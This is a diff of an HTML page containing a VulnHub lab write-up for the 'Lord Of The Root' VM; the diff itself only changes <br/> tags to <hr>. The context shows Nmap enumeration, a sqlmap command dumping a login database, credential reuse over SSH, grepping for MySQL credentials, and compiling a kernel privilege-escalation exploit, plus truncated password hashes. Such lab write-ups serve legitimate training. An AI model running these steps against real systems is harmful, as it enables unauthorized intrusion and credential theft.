@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20191009_vulnhub-kioptrix5.html"> « </a>📅 published on <code>10/Oct/2019</code><a href="/posts/20191010_vulnhub-linsecurity1.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root: 1.0.1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_lordoftheroot101/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_lordoftheroot101/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>1337/tcp/http/Apache httpd 2.4.7 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs">privesc_kernel_overlayfs</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_root">privesc_mysql_root</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_udf">privesc_mysql_udf</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Thu Oct 10 14:06:38 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/xml/_quick_tcp_nmap.xml 192.168.92.151
 Nmap scan report for 192.168.92.151
@@ -113,7 +113,7 @@ http://192.168.92.151:1337/978345210/index.php
 <pre class="nested"><code>ssh: smeagol
 webapp: frodo, smeagol, aragorn, legolas, gimli
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We run <code>sqlmap</code> against this login form and dump the contents of the backend database. Within this dump we find credentials for five users:  </p>
 <pre class="nested"><code>sqlmap -u &quot;http://192.168.92.151:1337/978345210/index.php&quot; --batch --forms --dump
 </code></pre>
@@ -124,7 +124,7 @@ webapp: frodo, smeagol, aragorn, legolas, gimli
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot09.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot10.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>smeagol@LordOfTheRoot&gt; id
 uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
 smeagol@LordOfTheRoot&gt;  
@@ -146,7 +146,7 @@ smeagol@LordOfTheRoot&gt; users
 root
 smeagol
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. While exploring the web root directory we find <code>mysql</code> credentials within the <code>login.php</code> file. This will be useful in next steps:  </p>
 <pre class="nested"><code>cd /var/www
 grep -nir mysql ./
@@ -193,7 +193,7 @@ gcc -o 39166 39166.c
 <pre class="nested"><code>cat /root/Flag.txt
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot15.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$6$cQPCchYp$rWjOEHF47iuaGk/DQdkG6Dhhfm3.hTaNZPO4MoyBz2.bn44fERcQ23XCsp43LOt5NReEUjwDF8WDa5i1M........................
 smeagol:$6$vu8Pfezj$6ldY35ytL8yRd.Gp947FnW3t/WrMZXIL7sqTQS4wuSKeAiYeoYCy7yfS2rBpAPvFCPuo73phXmpOoLsg5........................
@@ -203,7 +203,7 @@ smeagol:$6$vu8Pfezj$6ldY35ytL8yRd.Gp947FnW3t/WrMZXIL7sqTQS4wuSKeAiYeoYCy7yfS2rBp
 mysql: root/darksha...
 ssh: smeagol/MyPreciou.....
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a>  </li>
 <li><a href="https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README">https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README</a>  </li>
